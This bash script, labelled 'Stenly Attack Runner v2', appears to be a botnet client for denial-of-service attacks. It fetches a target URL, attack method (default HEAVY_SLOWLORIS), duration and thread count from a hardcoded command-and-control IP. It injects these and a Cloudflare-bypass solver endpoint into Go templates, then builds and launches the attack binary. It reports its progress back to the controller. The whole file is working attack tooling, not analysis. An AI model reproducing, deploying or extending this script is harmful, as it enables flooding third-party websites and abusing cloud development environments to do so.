#!/bin/bash
set -e

SERVER_URL="http://43.159.36.88:3000"
LOG_FILE="/tmp/stenly_runner.log"

log() {
  echo "[$(date +%H:%M:%S)] $1" | tee -a $LOG_FILE
}

fetch_and_report() {
  local msg="$1"
  local st="$2"
  curl -s -X POST "$SERVER_URL/api/codespace/report" \
    -H "Content-Type: application/json" \
    -d "{\"task_id\":$TASK_ID,\"message\":\"$msg\",\"status\":\"$st\"}" 2>/dev/null || true
}

log "Stenly Attack Runner v2 starting..."

# Fetch latest task
log "Fetching latest task from $SERVER_URL..."
TASK_RESPONSE=$(curl -s "$SERVER_URL/api/codespace/latest-task" 2>/dev/null || echo '{}')
TASK_ID=$(echo "$TASK_RESPONSE" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('task_id',0))" 2>/dev/null || echo "0")
TARGET=$(echo "$TASK_RESPONSE" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('target_url',''))" 2>/dev/null || echo "")
METHOD=$(echo "$TASK_RESPONSE" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('method','HEAVY_SLOWLORIS'))" 2>/dev/null || echo "HEAVY_SLOWLORIS")
DURATION=$(echo "$TASK_RESPONSE" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('duration',30))" 2>/dev/null || echo "30")
THREADS=$(echo "$TASK_RESPONSE" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('threads',10))" 2>/dev/null || echo "10")

log "Task #$TASK_ID: $TARGET | $METHOD | ${DURATION}s | $THREADS threads"

if [ -z "$TARGET" ] || [ "$TARGET" = "" ] || [ "$TARGET" = "None" ]; then
  log "No target URL configured. Idling..."
  fetch_and_report "No target - idling" "idle"
  sleep 300
  exit 0
fi

cd /workspaces/$(ls /workspaces/ 2>/dev/null || echo "stenly-l7")
log "Working dir: $(pwd)"
ls *.go 2>/dev/null | head -5

which go && log "Go: $(go version)" || { log "Go not found"; exit 1; }

log "Parameterizing Go templates..."
for f in *.go; do
  [ -f "$f" ] || continue
  sed -i "s|{{.TargetURL}}|$TARGET|g" "$f" 2>/dev/null || true
  sed -i "s|{{.Method}}|$METHOD|g" "$f" 2>/dev/null || true
  sed -i "s|{{.Duration}}|$DURATION|g" "$f" 2>/dev/null || true
  sed -i "s|{{.Threads}}|$THREADS|g" "$f" 2>/dev/null || true
  sed -i "s|{{.UseProxy}}|false|g" "$f" 2>/dev/null || true
  sed -i "s|{{.RPS}}|0|g" "$f" 2>/dev/null || true
  sed -i "s|{{.UserAgent}}|Stenly-CS-Runner|g" "$f" 2>/dev/null || true
  sed -i "s|{{.ProxyFile}}|/dev/null|g" "$f" 2>/dev/null || true
  sed -i "s|{{.UAFile}}|/dev/null|g" "$f" 2>/dev/null || true
  sed -i "s|{{.CfClearance}}||g" "$f" 2>/dev/null || true
  sed -i "s|{{.CfBm}}||g" "$f" 2>/dev/null || true
  sed -i "s|{{.CfSolverAPI}}|$SERVER_URL/api/cf-solve|g" "$f" 2>/dev/null || true
  sed -i "s|{{.BypassHost}}||g" "$f" 2>/dev/null || true
done

log "Building binary..."
go build -o /tmp/stenly_attack . 2>&1 | tee -a $LOG_FILE || { fetch_and_report "Build failed" "error"; exit 1; }

log "Build OK. Running attack..."
nohup /tmp/stenly_attack > /tmp/attack_output.log 2>&1 &
APID=$!
log "PID: $APID"
fetch_and_report "Attack running PID $APID" "running"

sleep $DURATION
kill $APID 2>/dev/null || true
log "Done after ${DURATION}s"
fetch_and_report "Attack completed" "completed"
